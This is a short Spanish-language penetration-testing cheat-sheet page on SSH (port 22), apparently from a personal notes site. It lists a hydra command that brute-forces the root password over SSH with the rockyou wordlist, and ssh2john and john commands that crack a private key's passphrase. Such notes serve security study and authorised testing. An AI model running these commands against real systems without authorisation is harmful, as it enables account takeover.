---
title: "SSH (22)"
layout: "single"
category: "Servicios"
slug: "servicios/ssh"
date: "2025-11-26"
---

### Fuerza Bruta
```bash
hydra -l root -P rockyou.txt ssh://<IP>
```

### Cracking Keys
```bash
ssh2john id_rsa > hash.txt
john hash.txt --wordlist=rockyou.txt
```
